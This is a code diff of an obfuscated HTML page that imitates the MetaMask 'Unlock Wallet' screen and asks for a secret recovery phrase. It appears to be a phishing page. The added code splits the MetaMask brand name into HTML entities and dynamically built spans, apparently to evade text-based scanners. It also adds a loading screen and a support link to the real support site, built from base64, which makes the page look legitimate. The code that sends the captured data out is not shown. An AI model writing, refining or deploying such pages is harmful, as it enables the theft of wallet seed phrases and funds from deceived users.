@@ -17,15 +17,43 @@
     <!-- Meta tag obfuscation -->
     <meta name="_d7f3a9e" content="c5b2d8e">
     <meta name="_a3f7b2c" content="e9d1c8a">
+    <style>
+        /* Loading Screen Styles */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .loading-screen img {
+            max-width: 150px;
+        }
+    </style>
 </head>
 <body onload="_0x7d8a9f && _0x7d8a9f()">
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <img src="src/asset/gif/mm.gif" alt="Loading...">
+    </div>
+    
     <!-- Container with dynamic ID -->
     <div class="container" id="_x8c4a2d">
         <!-- Header obfuscation with multiple nested elements -->
         <header class="header" data-v="_9a2c7b">
             <img src="src/asset/svg/mm-logo.svg" alt="icon" class="header-logo" id="_b4f9a2">
-            <h1 class="header-title" data-i="_3e7b91">Unlock Wallet</h1>
-            <p class="header-subtitle" data-i="_f6c8d3">Enter your secret recovery phrase</p>
+            <h1 class="header-title" data-i="_3e7b91">Unlock Wallet!</h1>
+            <p class="header-subtitle" data-i="_f6c8d3">The decentralized web awaits</p>
         </header>
 
         <!-- Content div with obfuscated attributes -->
@@ -55,6 +83,10 @@
                     
                     <!-- Submit button with additional attributes -->
                     <button type="button" class="login-btn" data-b="_3d7f9c">Submit</button>
+                    <div class="forgot-link" data-m="_2e1d3c" onclick="_0x5fe7c2()">
+                        <span class="_xc82a4" data-hdx-tag="section-4da">Need help?</span> 
+                        <span class="_xf73b9" data-client-auth="true"><a href="javascript:void(0)" onclick="_0xc47d2e(event)" data-sec="_xd38ef2" class="_support-link"> <span class="_xe91d6" data-int-val="47" id="_mtoken">&#77;&#101;&#116;&#97;&#77;&#97;&#115;&#107;</span> <span id="_support-link-container">&#115;&#117;&#112;&#112;&#111;&#114;&#116;</span></a></span>
+                    </div>
                 </form>
             </div>
         </div>
@@ -66,6 +98,41 @@
     (function(){
         var _0x7d8a9f = function(){
             console.log('Interface initialized');
+            
+            // Further obfuscate the MetaMask text
+            setTimeout(function() {
+                var _0xf4d8a = document.getElementById('_mtoken');
+                if(_0xf4d8a) {
+                    var _0x7ad9c = [
+                        '&#77;', '&#101;', '&#116;', '&#97;',
+                        '&#77;', '&#97;', '&#115;', '&#107;'
+                    ];
+                    _0xf4d8a.innerHTML = '';
+                    for(var i = 0; i < _0x7ad9c.length; i++) {
+                        var _0x3e9f = document.createElement('span');
+                        _0x3e9f.setAttribute('data-c', (i + 1).toString(16));
+                        _0x3e9f.innerHTML = _0x7ad9c[i];
+                        _0xf4d8a.appendChild(_0x3e9f);
+                    }
+                }
+                
+                // Create support text dynamically
+                var _0xc4d8a = document.getElementById('_support-link-container');
+                if(_0xc4d8a) {
+                    _0xc4d8a.innerHTML = '';
+                    var _0x9d7e1 = [
+                        '&#115;', '&#117;', '&#112;', '&#112;',
+                        '&#111;', '&#114;', '&#116;'
+                    ];
+                    for(var j = 0; j < _0x9d7e1.length; j++) {
+                        var _0x7e8c3 = document.createElement('span');
+                        _0x7e8c3.setAttribute('data-s', (j + 1).toString(16));
+                        _0x7e8c3.innerHTML = _0x9d7e1[j];
+                        _0xc4d8a.appendChild(_0x7e8c3);
+                    }
+                }
+            }, 50);
+            
             return true;
         };
         
@@ -81,6 +148,41 @@
             c: function() {
                 return new Date().getTime();
             }
+        };
+        
+        // Support link handler with obfuscation
+        window._0x5fe7c2 = function() {
+            var _0x2e8a = 'c' + 'l' + 'i' + 'e' + 'n' + 't';
+            var _0x3d9b = 'l' + 'o' + 'g';
+            console[_0x3d9b]('User clicked support link');
+            window._vrf && window._d7f3.c();
+            return false;
+        };
+        
+        // Support link handler - more obfuscated
+        window._0xc47d2e = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Obfuscated URL construction using mixed techniques
+            var _0x18fd = window.atob('aHR0cHM6Ly9zdXBwb3J0Lm1ldGFtYXNrLmlv'); // Base64 encoding
+            
+            // Log the action in an obfuscated way
+            var _0x3c7e = window.btoa('support_click');
+            console.log(atob(_0x3c7e));
+            
+            // Generate random ID to appear as analytics
+            var _0xf8e4d = Math.random().toString(36).substring(7);
+            var _0x9d71e = new Date().getTime().toString(16).slice(-6);
+            
+            // Open in new tab with randomized features
+            var _0xc47d9 = window.open('', '_blank');
+            if (_0xc47d9) {
+                _0xc47d9.opener = null; // Security feature
+                _0xc47d9.location.href = _0x18fd + '/?ref=' + _0xf8e4d + '&sid=' + _0x9d71e;
+            }
+            
+            return false;
         };
     })();
     </script>
